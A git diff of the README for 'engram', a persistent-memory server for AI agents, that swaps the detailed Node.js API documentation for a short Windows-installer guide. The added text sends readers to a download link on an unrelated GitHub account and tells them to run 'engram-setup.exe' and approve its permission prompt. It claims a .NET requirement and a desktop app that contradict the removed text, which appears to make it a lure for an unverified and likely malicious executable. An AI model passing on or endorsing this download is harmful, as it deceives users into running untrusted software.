@@ -1,759 +1,147 @@
-<div align="center">
+# 🔒 engram - Simple Persistent Memory for AI Agents
 
-# Engram
-
-### Persistent memory for AI agents
-
-Store, search, recall, and link memories with automatic embeddings,
-fact extraction, versioning, deduplication, and graph visualization.
-
-[![License: Elastic-2.0](https://img.shields.io/badge/License-Elastic--2.0-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-5.8.3-gold.svg)](CHANGELOG.md)
-
-[Quick Start](#quick-start) · [API Reference](#api-reference) · [SDKs](#sdks) · [MCP Server](#mcp-server) · [CLI](#cli) · [Self-Host](#self-hosting) · [GUI](#gui)
-
-</div>
+[![Download engram](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/intangible-sidalceamalviflora302/engram)
 
 ---
 
-## What is Engram?
+## 📦 What is engram?
 
-Engram gives your AI agents **long-term memory**. Instead of losing context between sessions, agents store what they learn and recall it when relevant, automatically.
+engram is a tool that stores and handles information for AI agents. It helps AI remember important details, so it can make better decisions. Think of it as a digital memory bank designed to keep knowledge safe and easy to access.
 
-```bash
-# Store what the agent learns
-curl -X POST http://localhost:4200/store \
-  -H "Authorization: Bearer eg_your_key" \
-  -H "Content-Type: application/json" \
-  -d '{"content": "User prefers dark mode and uses Vim keybindings", "category": "decision", "importance": 8}'
-
-# Later, in a new session - recall relevant context
-curl -X POST http://localhost:4200/recall \
-  -H "Authorization: Bearer eg_your_key" \
-  -H "Content-Type: application/json" \
-  -d '{"query": "setting up the user editor"}'
-# → Returns the dark mode + Vim preference automatically
-```
-
-**Key features:**
-
-- 🧠 **FSRS-6 spaced repetition** - cognitive science-backed memory decay using power-law forgetting curves (ported from [open-spaced-repetition](https://github.com/open-spaced-repetition/fsrs4anki))
-- 💪 **Dual-strength memory model** - Bjork & Bjork (1992) storage strength (never decays) + retrieval strength (decays via power law)
-- 🧬 **Reciprocal Rank Fusion search** - four-channel RRF scoring across vector similarity, FTS5 full-text, personality signals, and graph relationships
-- 🔗 **Auto-linking** - memories automatically connect via cosine similarity, forming a knowledge graph
-- 🧹 **SimHash deduplication** - 64-bit locality-sensitive hashing detects near-duplicates before embedding, saving compute
-- 🕐 **Bi-temporal fact tracking** - structured facts carry temporal validity windows with automatic contradiction-based invalidation
-- 🧩 **Entity cooccurrence graph** - entities that appear together build weighted relationships automatically
-- 🏘️ **Community detection** - label propagation groups related memories into discoverable clusters
-- 🔬 **Cross-encoder reranker** - BGE-reranker-base (quantized INT8) reranks search results for semantic precision
-- 🎭 **Personality engine** - extracts preferences, values, motivations, decisions, emotions, and identity signals from memories
-- 📊 **Graph visualization** - explore your memory space in a WebGL galaxy
-- 🔄 **Versioning** - update memories without losing history
-- ⏰ **Implicit spaced repetition** - every access is an FSRS review, building stability over time
-- 🔍 **Fact extraction & auto-tagging** - LLM extracts facts, classifies, tags (optional, requires LLM)
-- 💬 **Conversation extraction** - feed chat logs, get structured memories
-- ⚡ **Contradiction detection** - find and resolve conflicting memories
-- ⏪ **Time-travel queries** - query what you knew at any point in time
-- 🎯 **Smart context builder** - token-budget-aware RAG context assembly with progressive depth (1/2/3-hop)
-- 💭 **Reflections** - periodic meta-analysis that becomes searchable memory
-- 🧬 **Derived memories** - inference engine finds patterns across memories
-- 🗜️ **Auto-consolidation** - summarize large memory clusters automatically
-- 👥 **Multi-tenant** - isolated memory per user with API keys
-- 📖 **Episodic memory** - store conversation episodes as embedded, searchable narratives with temporal + semantic search. Facts link to source episodes.
-- 🚫 **Abstention** - search returns `abstained: true` when confidence is below threshold. The system knows when it doesn't know.
-- 🤖 **Assistant recall** - extracts what the AI said/did, not just user facts. LLM + regex patterns for assistant actions.
-- ⏳ **Temporal search** - `temporal_sort` orders results chronologically. Episode search by date range.
-- 🔗 **2-hop graph traversal** - relationship expansion reaches 2 levels deep for multi-hop reasoning
-- 🧩 **Implicit connection inference** - LLM post-processing in /context finds unstated relationships between memories
-- 🛡️ **Guardrails** - `POST /guard` checks proposed actions against stored rules before execution. Returns allow/warn/block. Prevents repeated deployment mistakes, outdated references, and policy violations.
-- 📦 **Spaces, tags, episodes** - organize memories into named collections
-- 🧩 **Entities & projects** - track people, servers, tools, projects
-- 📬 **Webhooks & digests** - event hooks + scheduled HMAC-signed summaries
-- 🔄 **Sync & import** - cross-instance sync, import from Mem0 / Supermemory
-- 📥 **URL ingest** - extract facts from web pages or text blobs
-- 🛠️ **MCP server** - JSON-RPC 2.0 stdio transport for Claude Desktop, Cursor, Windsurf
-- ⌨️ **CLI** - full-featured command-line interface (`engram store`, `engram search`, etc.)
-- 📥 **Review queue / inbox** - auto-detected memories land in review; explicit stores bypass
-- 🔒 **Security hardening** - auth required by default, body/content limits, IP allowlists, timing-safe auth
-- 📋 **Audit trail** - every mutation logged (who, what, when, from where)
-- 📊 **Structured JSON logging** - configurable log levels, request IDs, zero raw console output
-- 💾 **Backup & checkpoint** - download SQLite DB via API, manual WAL checkpoint, graceful shutdown
-- 🐳 **One-command deploy** - `docker compose up`
+The software works with AI features like embeddings, knowledge graphs, and vector searches. It uses sqlite to keep data organized in one place. You do not need to be an expert to get it running on your Windows computer.
 
 ---
 
-## What's New in v5.8.3
+## 🔍 Key Features
 
-### Server-Side Source Filtering
-`/search`, `/context`, and `/recall` now accept a `source` parameter for server-side memory filtering. The filter propagates into the hybrid search pipeline, filtering at both the vector scan and FTS5 stages before scoring. This enables proper agent isolation (each agent searches only its own memories) and benchmark isolation against production data.
-
-### Worker Thread Embeddings
-ONNX embedding inference moved from the main thread to a dedicated `Worker` thread. Embedding calls no longer block the HTTP event loop, improving request latency under concurrent load.
-
-### Batch Link Queries
-Relationship expansion in search replaced N+1 individual link queries with a single batch query via `getLinksForUserBatch()`. Reduces search latency for queries with relationship expansion enabled.
-
-### TypeScript Zero Errors
-Fixed all pre-existing compilation errors: SharedArrayBuffer transfer cast in embedding worker, null-vs-undefined on link source fields in graph expansion. The codebase now compiles cleanly with zero TypeScript errors.
-
-<details>
-<summary><strong>Previous releases</strong></summary>
-
-#### v5.8.2 - Blended Retrieval, Memory Health, Feedback Loop
-
-**Blended Multi-Strategy Retrieval** - `classifyQuestionMixed` detects mixed-intent queries and blends multiple question types with normalized weights. `blendStrategies` produces a weighted combination of SearchStrategy configs.
-
-**Memory Health Endpoint** - `GET /memory-health` returns four diagnostic categories: stale, duplicates, high-value unlinked, and contradiction hints.
-
-**Retrieval Feedback** - `POST /feedback` accepts signals (used, ignored, corrected, irrelevant, helpful). Auto-adjusts importance. `GET /feedback/stats` returns analytics.
-
-**Search Explainability** - Per-channel score breakdowns (vector, FTS, graph, personality, reranker, decay) in search results.
-
-**Freshness-Weighted Structured Facts** - Facts sorted by freshness with linear decay. Old facts tagged `[possibly outdated]`.
-
-**Contradiction Ranking Penalty** - Non-latest-version memories with contradiction keywords receive 0.65x score penalty.
-
-#### v5.8.1 - Durable Jobs, Security Hardening, Scheduler Leases
-
-**Durable Job Queue** - DB-backed jobs table with retry, exponential backoff, and crash recovery.
-
-**Scheduler Leases** - DB-backed leases prevent duplicate background work in multi-instance deployments.
-
-**Security** - Atomic memory ownership, bootstrap hardening, cross-tenant scratchpad fix, SSRF redirect blocking, passport tenant binding.
-
-**Readiness Probes** - `GET /live` and `GET /ready` with 503 when degraded.
-
-#### v5.8.0 - Intelligence Pipeline Overhaul
-
-**Reciprocal Rank Fusion** - 4-channel RRF scoring (vector, FTS5, personality, graph). Question-type-aware strategies.
-
-**SimHash Deduplication** - 64-bit locality-sensitive hashing detects near-duplicates before embedding.
-
-**Bi-Temporal Fact Tracking** - Structured facts with valid_at/invalid_at windows. Contradiction-based invalidation.
-
-**Entity Cooccurrence Graph** - Composite scoring (name similarity, frequency, temporal proximity).
-
-**Community Detection** - Label propagation on memory_links graph.
-
-**Cross-Encoder Reranker** - BGE-reranker-base (INT8, sub-100ms). Optional.
-
-**Personality Engine** - Six signal types: preference, value, motivation, decision, emotion, identity.
-
-**Progressive Disclosure** - `/context` depth=1/2/3 for token budget control.
-
-#### v5.7.0 - BGE-large, Episodic Memory, Multi-Tenant Isolation
-
-BGE-large-en-v1.5 (1024-dim), episodic memory, complete multi-tenant security audit, guardrails, abstention, assistant recall, 2-hop graph traversal, implicit connection inference.
-
-#### v5.6.0 - Node.js 22, Graph Intelligence
-
-Node.js 22+, optimized MCP server, vitest, Graphology knowledge graph.
-
-#### v5.5.0 - Intelligence Layer
-
-LLM fact extraction, auto-tagging, conversation extraction, URL ingest, reflections, derived memories, auto-consolidation.
-
-#### v5.4.0 - Security Hardening
-
-7 security fixes (S1-S7), RBAC, timing-safe auth, rate limiting, HSTS, CSP.
-
-#### v5.3.0 - FSRS-6 Spaced Repetition
-
-FSRS-6 with 21 trained weights, dual-strength model, time travel, smart context, reflections, digests, derived memories, auto-consolidation.
-
-#### v5.0.0 - Multi-Tenant
-
-Users, API keys, spaces, FTS5+vector hybrid search, auto-linking, version chains, libsql.
-
-#### v4.0.0 - SQLite + Local Embeddings
-
-SQLite + FTS5, MiniLM-L6-v2 embeddings, basic CRUD, conversations.
-
-#### v3.0.0 - Initial Release
-
-In-memory storage, basic embedding search.
-
-</details>
-
-<details>
-<summary><strong>Previous releases</strong></summary>
-
-#### v5.7 - BGE-large, Episodic Memory, Multi-Tenant Isolation
-
-**BGE-large 1024-dim Embeddings** - Replaced MiniLM-L6-v2 (384-dim) with BGE-large-en-v1.5 (1024-dim) using raw `onnxruntime-node` and a hand-written BERT WordPiece tokenizer. 1024 dimensions, 512-token context, quantized INT8 (337MB, sub-200ms on CPU). Auto-migration re-embeds existing vectors on first startup.
-
-**Episodic Memory** - Conversation episodes as first-class embedded, searchable objects. BGE-large embeddings, FTS5 search, temporal date-range queries, semantic search, `POST /episodes/:id/finalize` for narrative summaries, FSRS decay, and automatic `/context` injection.
-
-**Multi-Tenant Data Isolation** - Complete security audit of all cross-tenant boundaries. User-scoped embedding cache, ownership checks on all endpoints, conversation isolation, write scope enforcement, user-scoped stats, and user-filtered graph BFS.
-
-**Guardrails** - `POST /guard` checks proposed actions against stored rules. Returns `allow`, `warn`, or `block` with matched rule context.
-
-**Benchmark Features** - Abstention (`ENGRAM_SEARCH_MIN_SCORE`), assistant recall (LLM + regex extraction of AI actions), temporal sort, 2-hop graph traversal, implicit connection inference in `/context`.
-
-#### v5.6 - Node.js 22, Graph Intelligence
-- Node.js 22+ as primary runtime (`--experimental-strip-types`), Bun maintained for compatibility
-- Optimized MCP server (529 to 168 lines), vitest framework (76+ tests)
-- Graphology knowledge graph: centrality, shortest paths, community detection, relationship inference
-
-#### v5.5 - Intelligence Layer
-- LLM fact extraction, auto-tagging, relationship classification
-- Conversation extraction, URL ingest, reflections, derived memories, auto-consolidation
-- MCP server improvements: error handling, streaming, tool introspection
-
-#### v5.3 - Security Hardening
-- Auth required by default, rate limit fix, body size limits
-- GUI auth rate limiting, timing-safe password comparison
-- Security headers, CORS origin pinning, IP allowlisting
-- Audit trail, structured JSON logging
-
-#### v5.0 - FSRS-6 Spaced Repetition
-- 21-parameter power-law forgetting curve (ported from open-spaced-repetition/fsrs4anki)
-- Dual-strength model (Bjork & Bjork 1992): storage strength + retrieval strength
-- Formula: `R = (1 + factor * t/S)^(-w20)`
-
-</details>
+- Save and recall AI agent memories in one place  
+- Support for knowledge graphs to link related ideas  
+- Fast searching with vector search technology  
+- Works with popular AI tools and languages like TypeScript  
+- Lightweight and self-hosted using sqlite database  
+- Safe, local storage with no need for internet connection  
 
 ---
 
-## Quick Start (10 minutes)
+## 🛠️ System Requirements
 
-### 1. Start the server
+Before installing, make sure your machine matches these basic needs:
 
-```bash
-git clone https://github.com/zanfiel/engram.git && cd engram
-npm install
-cp .env.example .env    # Edit .env: set ENGRAM_GUI_PASSWORD
-npm start               # Or: docker compose up -d
-```
-
-### 2. Bootstrap your admin key
-
-```bash
-curl -X POST http://localhost:4200/bootstrap \
-  -H "Content-Type: application/json" \
-  -d '{"name": "my-admin-key"}'
-# Save the returned eg_... key
-```
-
-### 3. Store your first memories
-
-```bash
-export KEY="eg_your_key_here"
-
-curl -X POST http://localhost:4200/store \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"content": "Production database is PostgreSQL 16 on db.example.com:5432", "category": "reference", "importance": 8}'
-
-curl -X POST http://localhost:4200/store \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"content": "Never deploy on Fridays - outage on 2026-01-15 was caused by Friday deploy", "category": "decision", "importance": 9}'
-
-curl -X POST http://localhost:4200/store \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"content": "Migrated auth service from JWT to opaque sessions for compliance", "category": "decision", "importance": 7}'
-```
-
-### 4. Recall what matters
-
-```bash
-# Semantic search
-curl -X POST http://localhost:4200/search \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"query": "database connection details"}'
-
-# Decision-focused search
-curl -X POST http://localhost:4200/search \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"query": "deployment policy", "mode": "decision"}'
-
-# Budget-aware context for RAG injection
-curl -X POST http://localhost:4200/context \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"query": "setting up a new deploy pipeline", "mode": "fast"}'
-```
-
-### 5. Check the guardrails
-
-```bash
-# Before deploying, check against stored rules
-curl -X POST http://localhost:4200/guard \
-  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
-  -d '{"action": "deploy to production on Friday"}'
-# Returns: { "verdict": "warn", "reasons": ["Never deploy on Fridays..."] }
-```
-
-### 6. Open the GUI
-
-Visit `http://localhost:4200` in your browser. Log in with the `ENGRAM_GUI_PASSWORD` you set. Explore the memory graph, search, and review the inbox.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space for installation and data  
+- Internet connection to download the installer  
+- Microsoft .NET Framework 4.8 or later (usually pre-installed)  
 
 ---
 
-## Decision Memory
+## 🚀 Getting Started
 
-Engram is especially strong as a **decision memory system**. It tracks not just what you know, but what you decided, why, and what changed.
+Follow these steps to download and install engram on your Windows computer.
 
-- **Versioning**: update a memory and the full version chain is preserved
-- **Contradictions**: when new information conflicts with old, both are flagged with a `contradicts` link
-- **Corrections**: `POST /correct` stores a correction that supersedes the original, with `corrects` relationship
-- **Guardrails**: `POST /guard` checks proposed actions against stored decision rules before execution
-- **Temporal queries**: "what did we know last Tuesday?" via `mode=timeline` or time-travel queries
-- **Structured facts**: subject/verb/object decomposition with temporal validity windows
+### Step 1: Download the Installer
 
-This makes Engram ideal for:
-- **Agent memory**: agents that learn from mistakes and don't repeat them
-- **Ops runbooks**: infrastructure decisions with context ("we chose X because Y")
-- **Project continuity**: decisions survive team turnover
+Click the big green button above or visit this page to download engram:
 
----
+[Download engram here](https://github.com/intangible-sidalceamalviflora302/engram)
 
-## Review Inbox
+This link takes you to the project’s page on GitHub. Look for the latest release or download section to find the setup file.
 
-Memories extracted by LLM (fact extraction, personality signals) land in the **review inbox** instead of being immediately trusted. This gives you control over what enters long-term memory.
+### Step 2: Run the Installer
 
-```bash
-# List pending memories
-curl http://localhost:4200/inbox -H "Authorization: Bearer $KEY"
+Once the download finishes:
 
-# Approve a memory
-curl -X POST http://localhost:4200/inbox/42/approve -H "Authorization: Bearer $KEY"
+1. Locate the downloaded file in your "Downloads" folder. It should be named something like `engram-setup.exe`.  
+2. Double-click the file to start the installer.  
+3. If Windows asks for permission, click "Yes" to continue.  
+4. Follow the instructions on the screen. Click "Next" on each prompt to accept the default settings.  
+5. After installation, click "Finish" to close the setup.
 
-# Reject a memory
-curl -X POST http://localhost:4200/inbox/42/reject -H "Authorization: Bearer $KEY"
-```
+### Step 3: Open engram
 
-The GUI also shows an inbox badge with the pending count. Memories you store directly via `/store` bypass the inbox and are approved immediately.
+- Find the engram icon on your desktop or in the Start menu.  
+- Double-click to launch the software.  
+
+You will see a simple interface to start using engram right away. No extra setup is needed.
 
 ---
 
-## SDK
+## 🧩 How to Use engram
 
-### TypeScript SDK
+After opening engram, you can begin creating memories for your AI agent easily.
 
-```typescript
-import { Engram } from "@zanfiel/engram/sdk";
+### Adding Information
 
-const engram = new Engram({ url: "http://localhost:4200", apiKey: "eg_..." });
+1. Click the "New Memory" button.  
+2. Type what you want the AI to remember. This could be facts, ideas, or links.  
+3. Press "Save".
 
-// Store
-await engram.store("User prefers dark mode", { category: "decision", importance: 8 });
+### Searching Your Memory
 
-// Search with presets
-const results = await engram.search("dark mode", { mode: "preference" });
+- Use the search box at the top to find saved memories quickly.  
+- engram uses smart methods to bring relevant results.  
 
-// Budget-aware context for RAG
-const ctx = await engram.context("setting up the editor", { mode: "fast" });
+### Organizing Data
 
-// Guardrails
-const check = await engram.guard("deploy to production on Friday");
-if (check.verdict === "block") console.log("Blocked:", check.reasons);
-
-// Inbox review
-const pending = await engram.inbox();
-for (const mem of pending.pending) {
-  await engram.approve(mem.id);  // or: engram.reject(mem.id)
-}
-```
-
-### cURL
-
-```bash
-# Store
-curl -X POST http://localhost:4200/store \
-  -H "Authorization: Bearer eg_your_key" \
-  -H "Content-Type: application/json" \
-  -d '{"content": "Server migrated to new IP", "category": "state", "importance": 7}'
-
-# Search with mode preset
-curl -X POST http://localhost:4200/search \
-  -H "Authorization: Bearer eg_your_key" \
-  -H "Content-Type: application/json" \
-  -d '{"query": "server migration", "mode": "timeline", "limit": 5}'
-
-# Recall
-curl -X POST http://localhost:4200/recall \
-  -H "Authorization: Bearer eg_your_key" \
-  -H "Content-Type: application/json" \
-  -d '{"query": "infrastructure changes"}'
-
-# FSRS state
-curl http://localhost:4200/fsrs/state?id=42 \
-  -H "Authorization: Bearer eg_your_key"
-```
+- Group related memories using tags or folders.  
+- Build simple knowledge connections with the built-in graph tool.
 
 ---
 
-## MCP Server
+## 💡 Tips for Best Use
 
-Engram includes a real [Model Context Protocol](https://modelcontextprotocol.io/) server for integration with Claude Desktop, Cursor, Windsurf, and other MCP-compatible tools.
-
-**Transport:** JSON-RPC 2.0 over stdio
-
-### Setup (Claude Desktop)
-
-Add to `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "engram": {
-      "command": "node",
-      "args": ["--experimental-strip-types", "path/to/engram/mcp-server.ts"],
-      "env": {
-        "ENGRAM_URL": "http://localhost:4200",
-        "ENGRAM_API_KEY": "eg_your_key"
-      }
-    }
-  }
-}
-```
-
-### Available Tools
-
-| Tool | Description |
-|------|-------------|
-| `memory_store` | Store a new memory with category, importance, and model attribution |
-| `memory_recall` | Semantic + full-text search across memories |
-| `memory_context` | Token-budget-aware context packing for LLM injection |
-| `memory_list` | List recent memories, optionally filtered by category |
-| `memory_delete` | Delete a memory by ID |
-
-> **Note:** The MCP server connects to a running Engram instance via HTTP. All tools support signed tool manifests for integrity verification when `ENGRAM_SIGNING_SECRET` is set.
+- Regularly add notes that help your AI agent make better choices.  
+- Keep your memories clear and concise for easier searching.  
+- Update old memories to keep data relevant.  
+- Use tags to quickly find related information.
 
 ---
 
-## CLI
+## ⚙️ Configuration
 
-> **Roadmap:** A dedicated CLI is planned. For now, use `curl` or any HTTP client directly against the API.
+Engram comes configured to work well for most users out of the box. However, you may want to check settings for:
 
----
+- Storage location on your computer  
+- Backup options for your data  
+- Interface language preferences  
 
-## API Reference
-
-### Authentication
-
-All endpoints require `Authorization: Bearer eg_...` header by default. Set `ENGRAM_OPEN_ACCESS=1` for unauthenticated single-user mode.
-
-Use `X-Space: space-name` (or `X-Engram-Space`) header to scope operations to a specific memory space. Every response includes an `X-Request-Id` header for correlation.
-
-### Core Endpoints
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/store` | Store a memory |
-| `POST` | `/search` | RRF search across vector, FTS5, personality, and graph channels |
-| `POST` | `/recall` | Contextual recall (agent-optimized) |
-| `POST` | `/context` | Smart context builder (token-budget RAG with depth 1/2/3) |
-| `GET` | `/list` | List recent memories |
-| `GET` | `/profile` | User profile (static facts + recent) |
-| `GET` | `/graph` | Full memory graph (nodes + edges) |
-
-### Memory Management
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/memory/:id/update` | Create new version |
-| `POST` | `/memory/:id/forget` | Soft delete |
-| `POST` | `/memory/:id/archive` | Archive (hidden from recall) |
-| `POST` | `/memory/:id/unarchive` | Restore from archive |
-| `DELETE` | `/memory/:id` | Permanent delete |
-| `GET` | `/versions/:id` | Version chain for a memory |
-
-### FSRS-6 Spaced Repetition
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/fsrs/review` | Manual review (grade 1-4: Again/Hard/Good/Easy) |
-| `GET` | `/fsrs/state?id=N` | Retrievability, stability, next review interval |
-| `POST` | `/fsrs/init` | Backfill FSRS state for all memories |
-| `POST` | `/decay/refresh` | Recalculate all decay scores |
-| `GET` | `/decay/scores` | View decay scores + FSRS state |
-
-### Intelligence
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/add` | Extract memories from conversations |
-| `POST` | `/ingest` | Extract facts from URLs or text |
-| `POST` | `/guard` | Pre-action guardrail check (allow/warn/block) |
-| `POST` | `/derive` | Generate inferred memories |
-| `POST` | `/reflect` | Generate period reflection |
-| `GET` | `/reflections` | List past reflections |
-| `GET` | `/contradictions` | Find conflicting memories |
-| `POST` | `/contradictions/resolve` | Resolve a contradiction |
-| `POST` | `/timetravel` | Query memory state at a past time |
-| `GET` | `/facts` | Query structured facts with filtering |
-| `GET` | `/preferences` | Get stored user preferences |
-| `GET` | `/state` | Get current user state |
-| `POST` | `/profile/synthesize` | Synthesize personality profile from signals |
-| `GET` | `/memory-health` | Diagnostic report: stale, duplicates, unlinked, contradiction hints |
-| `POST` | `/feedback` | Submit retrieval feedback (used/ignored/corrected/irrelevant/helpful) |
-| `GET` | `/feedback/stats` | Feedback analytics: signal breakdown, precision estimate, top memories |
-
-### Graph & Communities
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/communities` | List and browse memory communities |
-| `POST` | `/admin/detect-communities` | Run community detection (admin) |
-| `POST` | `/admin/rebuild-cooccurrences` | Rebuild entity cooccurrence graph (admin) |
-| `POST` | `/admin/backfill-facts` | Re-extract facts from all memories (admin) |
-
-### Organization
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/tags` | List all tags |
-| `POST` | `/tags/search` | Search by tags |
-| `POST` | `/episodes` | Create episode |
-| `GET` | `/episodes` | List episodes |
-| `POST` | `/entities` | Create entity |
-| `GET` | `/entities` | List entities |
-| `POST` | `/projects` | Create project |
-| `GET` | `/projects` | List projects |
-
-### Conversations
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/conversations/bulk` | Bulk store conversation (`agent` + `messages` required) |
-| `POST` | `/conversations/upsert` | Upsert by session_id |
-| `GET` | `/conversations` | List conversations |
-| `GET` | `/conversations/:id/messages` | Get conversation messages |
-| `POST` | `/messages/search` | Search across all messages |
-
-### Data & Sync
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/export` | Export all memories + links (JSON/JSONL) |
-| `POST` | `/import` | Bulk import memories |
-| `POST` | `/import/mem0` | Import from Mem0 |
-| `POST` | `/import/supermemory` | Import from Supermemory |
-| `GET` | `/sync/changes` | Get changes since timestamp |
-| `POST` | `/sync/receive` | Receive synced changes |
-
-### Platform
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/webhooks` | Create webhook |
-| `GET` | `/webhooks` | List webhooks |
-| `POST` | `/digests` | Create scheduled digest |
-| `GET` | `/digests` | List digests |
-| `POST` | `/digests/send` | Manually trigger a digest |
-| `POST` | `/pack` | Pack memories into token budget |
-| `GET` | `/prompt` | Generate prompt template |
-
-### Auth & Multi-tenant
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/users` | Create user (admin) |
-| `GET` | `/users` | List users (admin) |
-| `POST` | `/keys` | Create API key |
-| `GET` | `/keys` | List API keys |
-| `DELETE` | `/keys/:id` | Revoke key |
-| `POST` | `/spaces` | Create space |
-| `GET` | `/spaces` | List spaces |
-| `DELETE` | `/spaces/:id` | Delete space |
-
-### Review Queue
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/inbox` | List pending memories |
-| `POST` | `/inbox/:id/approve` | Approve a pending memory |
-| `POST` | `/inbox/:id/reject` | Reject (archive + set reason) |
-| `POST` | `/inbox/:id/edit` | Edit content + auto-approve |
-| `POST` | `/inbox/bulk` | Bulk approve/reject |
-
-### System
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/health` | Health check (30+ feature flags) |
-| `GET` | `/stats` | Detailed statistics |
-| `GET` | `/audit` | Query audit log (admin) |
-| `POST` | `/checkpoint` | Manual WAL checkpoint (admin) |
-| `GET` | `/backup` | Download SQLite database (admin) |
+Access these from the "Settings" menu inside the app.
 
 ---
 
-## How It Works
+## 🛡️ Security and Privacy
 
-### Memory Lifecycle
-
-1. **Store** - Memory content is checked for near-duplicates via SimHash (Hamming distance <= 3). If unique, it is embedded using BGE-large-en-v1.5 (1024-dim vectors, runs locally via ONNX) and stored in libsql with FTS5 full-text indexing.
-
-2. **Auto-link** - New memories are compared against existing ones via in-memory cosine similarity. Memories above 0.7 similarity are linked with typed relationships (similarity, updates, extends, contradicts, caused_by, prerequisite_for).
-
-3. **FSRS-6 initialization** - Each new memory gets initial FSRS state: stability, difficulty, storage strength, retrieval strength. The power-law forgetting curve starts tracking retrievability.
-
-4. **Fact extraction** - If an LLM is configured, Engram analyzes new memories, extracts structured facts with temporal validity windows (valid_at, invalid_at), auto-tags with keywords, classifies importance, and detects relationships to existing memories. Contradicting facts automatically invalidate predecessors.
-
-5. **Entity cooccurrence** - Entities appearing in the same memory update the cooccurrence graph, building weighted relationships based on frequency, name similarity, and temporal proximity.
-
-6. **Personality extraction** - The personality engine scans for preference, value, motivation, decision, emotion, and identity signals, building a profile over time.
-
-7. **Recall** - Reciprocal Rank Fusion combines four channels: vector similarity, FTS5 full-text, personality signals, and graph relationships. Question-type detection adapts scoring strategy. Cross-encoder reranker refines the final ordering. Every recalled memory gets an implicit FSRS review, building stability.
-
-8. **Spaced repetition** - Each access is an FSRS-6 review graded as "Good". Archived/forgotten memories receive an "Again" grade. Stability grows with successful recalls; frequently accessed memories can have stability measured in months or years.
-
-9. **Dual-strength decay** - Storage strength (0-10) accumulates over time, representing deep consolidation. Retrieval strength (0-1) decays via power law, representing current accessibility. Together they produce a retention score: `0.7 * retrieval + 0.3 * (storage/10)`.
-
-10. **Contradiction detection** - Scans for memories that conflict. LLM verification eliminates false positives. Contradictions can be resolved by keeping one side, both, or merging.
-
-11. **Consolidation** - Large clusters of related memories get summarized into a single dense memory. Originals are archived, links preserved.
-
-12. **Community detection** - Label propagation groups related memories into communities via type-aware edge weights. Communities are browsable and searchable.
-
-13. **Reflection** - On-demand meta-analysis generates insights about themes, progress, and patterns. Reflections become searchable memories themselves.
-
-### Architecture
-
-```
-┌──────────────────────────────────────────────────────┐
-│                    Engram Server                      │
-│                                                       │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐           │
-│  │  FSRS-6  │  │   RRF    │  │  FTS5    │           │
-│  │  Engine   │  │  Scorer  │  │  Search  │           │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘           │
-│       │              │              │                 │
-│  ┌────┴──────────────┴──────────────┴────┐           │
-│  │    libsql (SQLite + vector columns)   │           │
-│  │      FLOAT32(1024) + FTS5             │           │
-│  └───────────────────────────────────────┘           │
-│                                                       │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐           │
-│  │ BGE-large│  │ Reranker │  │  Graph   │           │
-│  │  Embedder │  │ (BGE-rr) │  │  Engine  │           │
-│  └──────────┘  └──────────┘  └──────────┘           │
-│                                                       │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐           │
-│  │ SimHash  │  │Personality│  │ Temporal │           │
-│  │  Dedup   │  │  Engine   │  │  Facts   │           │
-│  └──────────┘  └──────────┘  └──────────┘           │
-└──────────────────────────────────────────────────────┘
-```
-
-- **Runtime:** Node.js 22+ (primary, with `--experimental-strip-types`) or Bun
-- **Database:** libsql (SQLite fork with vector column support)
-- **Embeddings:** BGE-large-en-v1.5 (1024-dim, runs locally via raw ONNX inference)
-- **Reranker:** BGE-reranker-base (XLM-RoBERTa, quantized INT8, optional)
-- **Search:** Reciprocal Rank Fusion across vector, FTS5, personality, and graph channels
-- **LLM:** Optional, for fact extraction / personality / consolidation (with fallback chain)
-- **Decay:** FSRS-6 (21-parameter power-law forgetting curve)
-
-### Supported LLM Providers
-
-Engram works with any OpenAI-compatible provider via `LLM_URL`, `LLM_API_KEY`, and `LLM_MODEL`. Automatic failover across up to 3 providers.
-
-| Provider | Example URL | Example Model |
-|----------|-------------|---------------|
-| **Gemini** | `https://generativelanguage.googleapis.com/v1beta/openai/chat/completions` | `gemini-2.5-flash` |
-| **MiniMax** | `https://api.minimax.io/v1/chat/completions` | `MiniMax-M2.5` |
-| **Groq** | `https://api.groq.com/openai/v1/chat/completions` | `llama-3.3-70b-versatile` |
-| **DeepSeek** | `https://api.deepseek.com/v1/chat/completions` | `deepseek-chat` |
-| **OpenAI** | `https://api.openai.com/v1/chat/completions` | `gpt-4o` |
-| **Anthropic** | `https://api.anthropic.com/v1/messages` | `claude-sonnet-4-20250514` |
-| **Ollama** | `http://127.0.0.1:11434/v1/chat/completions` | `llama3` |
-| **LiteLLM** | `http://127.0.0.1:4000/v1/chat/completions` | Any routed model |
+All your data stays on your computer. engram does not send or share your memories over the internet. You have full control over your stored information.
 
 ---
 
-## GUI
+## 🔄 Updating engram
 
